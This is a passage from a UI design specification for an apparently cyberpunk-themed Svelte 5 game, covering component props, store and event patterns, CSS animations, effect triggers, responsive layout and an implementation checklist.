│   - Numeric input with increment/decrement
│   Props: value
│          min, max
│          step
│
├── SliderInput.svelte
│   - Range slider
│   Props: value
│          min, max
│          showValue
│
├── Select.svelte
│   - Dropdown selection
│   Props: options
│          value
│
└── Toggle.svelte
    - On/off toggle
    Props: checked
           label
```

### 6.5 Feedback Components

```
feedback/
├── Toast.svelte
│   - Notification toast
│   Props: message
│          variant ('success' | 'error' | 'warning' | 'info')
│          duration
│
├── Alert.svelte
│   - Inline alert message
│   Props: message
│          variant
│          dismissible
│
└── ConfirmDialog.svelte
    - Confirmation modal
    Props: title
           message
           confirmText
           cancelText
           onConfirm
           onCancel
```

---

## 7. Component Patterns

### 7.1 Props Pattern (Svelte 5)

```svelte
<!-- Example: Button.svelte -->
<script lang="ts">
  import type { Snippet } from 'svelte';

  interface Props {
    variant?: 'primary' | 'secondary' | 'danger' | 'ghost';
    size?: 'sm' | 'md' | 'lg';
    hotkey?: string;
    disabled?: boolean;
    loading?: boolean;
    onclick?: () => void;
    children: Snippet;
  }

  let {
    variant = 'primary',
    size = 'md',
    hotkey,
    disabled = false,
    loading = false,
    onclick,
    children,
  }: Props = $props();
</script>

<button
  class="btn btn-{variant} btn-{size}"
  {disabled}
  onclick={onclick}
>
  {#if hotkey}
    <span class="hotkey">{hotkey}</span>
  {/if}
  {#if loading}
    <Spinner size="sm" />
  {:else}
    {@render children()}
  {/if}
</button>
```

### 7.2 Store Consumption Pattern

```svelte
<!-- Example: FeedPanel.svelte -->
<script lang="ts">
  import { getContext, onMount, onDestroy } from 'svelte';
  import { FEED_KEY } from '$lib/features/feed/store.svelte';
  import type { FeedStore } from '$lib/features/feed/store.svelte';
  import FeedItem from './FeedItem.svelte';
  import Box from '$lib/ui/terminal/Box.svelte';

  // Get store from context
  const feed = getContext<FeedStore>(FEED_KEY);

  // Derived state
  let visibleItems = $derived(feed.visibleItems);
  let isStreaming = $derived(feed.isStreaming);
</script>

<Box title="LIVE FEED">
  <div class="feed-header">
    <span class="indicator" class:online={isStreaming}>●</span>
    <span class="label">STREAMING</span>
  </div>

  <div class="feed-list">
    {#each visibleItems as item (item.id)}
      <FeedItem {item} />
    {/each}
  </div>
</Box>
```

### 7.3 Event Handling Pattern

```svelte
<!-- Example: QuickActionButton.svelte -->
<script lang="ts">
  import { getContext } from 'svelte';
  import { EVENT_BUS_KEY } from '$lib/core/events/bus.svelte';
  import type { EventBus } from '$lib/core/events/bus.svelte';

  interface Props {
    action: 'JACK_IN' | 'EXTRACT' | 'TYPING' | 'HACKRUN';
    hotkey: string;
    label: string;
  }

  let { action, hotkey, label }: Props = $props();

  const eventBus = getContext<EventBus>(EVENT_BUS_KEY);

  function handleClick() {
    eventBus.emit({ type: `USER_${action}_START` as any });
  }

  // Keyboard shortcut
  function handleKeydown(e: KeyboardEvent) {
    if (e.key.toUpperCase() === hotkey.replace(/[\[\]]/g, '')) {
      handleClick();
    }
  }
</script>

<svelte:window onkeydown={handleKeydown} />

<button class="quick-action" onclick={handleClick}>
  <span class="hotkey">{hotkey}</span>
  <span class="label">{label}</span>
</button>
```

### 7.4 Animation Pattern

```svelte
<!-- Example: AnimatedNumber.svelte -->
<script lang="ts">
  import { tweened } from 'svelte/motion';
  import { cubicOut } from 'svelte/easing';

  interface Props {
    value: number;
    format?: (n: number) => string;
    duration?: number;
  }

  let { 
    value, 
    format = (n) => n.toLocaleString(), 
    duration = 500 
  }: Props = $props();

  const displayValue = tweened(value, {
    duration,
    easing: cubicOut,
  });

  // Update when value changes
  $effect(() => {
    displayValue.set(value);
  });
</script>

<span class="animated-number">
  {format($displayValue)}
</span>
```

---

## 8. Animation & Effects

### 8.1 CSS Animations (From Master Design)

```css
/* Screen Flicker */
@keyframes flicker {
  0%, 100% { opacity: 1; }
  92% { opacity: 1; }
  93% { opacity: 0.8; }
  94% { opacity: 1; }
  95% { opacity: 0.9; }
  96% { opacity: 1; }
}

/* Death Flash */
@keyframes death-flash {
  0% { background: var(--bg-primary); }
  10% { background: var(--red-glow); }
  20% { background: var(--bg-primary); }
  30% { background: var(--red-glow); }
  40% { background: var(--bg-primary); }
  100% { background: var(--bg-primary); }
}

/* Jackpot Celebration */
@keyframes jackpot {
  0% { 
    text-shadow: 0 0 5px var(--gold);
    transform: scale(1);
  }
  50% { 
    text-shadow: 0 0 30px var(--gold), 0 0 60px var(--gold);
    transform: scale(1.1);
  }
  100% { 
    text-shadow: 0 0 5px var(--gold);
    transform: scale(1);
  }
}

/* Pulse */
@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.5; }
}

/* Text glow */
.glow-text {
  text-shadow: 
    0 0 5px var(--green-glow),
    0 0 10px var(--green-glow),
    0 0 20px var(--green-glow);
}
```

### 8.2 Svelte Transitions

```svelte
<!-- Feed item enter/exit -->
<script>
  import { fly, fade } from 'svelte/transition';
</script>

{#each items as item (item.id)}
  <div 
    in:fly={{ y: -10, duration: 200 }}
    out:fade={{ duration: 100 }}
  >
    ...
  </div>
{/each}
```

### 8.3 Effect Triggers (From Master Design)

| Event | Visual Effect | Sound |
|-------|---------------|-------|
| JACK_IN | Green text pulse | `jackIn` |
| EXTRACT | Gold/cyan text, coin animation | `extract` |
| TRACED (you) | RED screen flash, shake | `traced` (100%) |
| TRACED (other) | Red flash on feed line | `traced` (20%) |
| SURVIVED (you) | GREEN screen flash | `survived` |
| SURVIVED (other) | Green pulse on feed | - |
| SCAN_WARNING | Amber pulse | `warning` |
| SCAN_WARNING (<10s) | Urgent amber | `urgentTick` |
| JACKPOT | GOLD text, particles, shake | `jackpot` |
| WHALE_ALERT | Special glow, larger text | `whaleAlert` |
| Typing correct | - | `keyPress` |
| Typing error | Red flash on char | `keyError` |
| Typing complete | - | `typeComplete` |
| Perfect typing | Cyan flash | `perfectType` |

---

## 9. Responsive Design

### Breakpoints

```css
:root {
  --breakpoint-sm: 640px;   /* Mobile */
  --breakpoint-md: 768px;   /* Tablet */
  --breakpoint-lg: 1024px;  /* Desktop */
  --breakpoint-xl: 1280px;  /* Wide desktop */
}
```

### Layout Adaptations

| Viewport | Layout |
|----------|--------|
| < 768px (Mobile) | Single column, stacked panels |
| 768-1024px (Tablet) | Two columns, collapsible sidebar |
| > 1024px (Desktop) | Full layout as specified |

### Mobile Considerations

1. **Feed Panel** - Full width, scrollable
2. **Position Panel** - Collapsible into header summary
3. **Quick Actions** - Bottom navigation bar
4. **Typing Game** - Full screen, virtual keyboard consideration
5. **Navigation** - Bottom tab bar instead of horizontal

---

## 10. Implementation Checklist

### Phase 1: Design System (Week 1)

- [ ] CSS tokens (colors, typography, spacing)
- [ ] Terminal shell (Shell, Scanlines, Flicker)
- [ ] Box component
- [ ] Button component
- [ ] ProgressBar component
- [ ] AnimatedNumber component
- [ ] Countdown component

### Phase 2: Command Center (Week 2)

- [ ] Header component
- [ ] FeedPanel + FeedItem
- [ ] NetworkVitalsPanel
- [ ] PositionPanel
- [ ] ModifiersPanel
- [ ] QuickActionsPanel
- [ ] NavigationBar

### Phase 3: Typing Game (Week 3)

- [ ] IdleView
- [ ] CountdownView
- [ ] ActiveView (typing input)
- [ ] CompleteView
- [ ] Store integration

### Phase 4: Additional Screens (Week 4-5)

- [ ] Hack Run screens
- [ ] Dead Pool screens
- [ ] Crew panel
- [ ] Daily Ops

### Phase 5: Polish (Week 6)

- [ ] All animations
- [ ] Sound integration
- [ ] Screen flash effects
- [ ] Mobile responsive
- [ ] Accessibility review

---

## Appendix: Component File Naming

```
lib/
├── ui/
│   ├── primitives/
│   │   ├── Button.svelte
│   │   ├── Button.test.ts
│   │   └── index.ts
│   │
│   ├── terminal/
│   │   ├── Shell.svelte
│   │   ├── Box.svelte
│   │   └── index.ts
│   │
│   └── data-display/
│       ├── StatRow.svelte
│       └── index.ts
│
├── features/
│   ├── feed/
│   │   ├── store.svelte.ts
│   │   ├── FeedPanel.svelte
│   │   ├── FeedItem.svelte
│   │   └── index.ts
│   │
│   └── typing/
│       ├── store.svelte.ts
│       ├── TypingGame.svelte
│       ├── TypingInput.svelte
│       └── index.ts
```

**Naming conventions:**
- Components: `PascalCase.svelte`
- Stores: `store.svelte.ts` (in feature folder)
- Tests: `*.test.ts` or `*.svelte.test.ts`
- Index exports: `index.ts`

---

*End of Document*
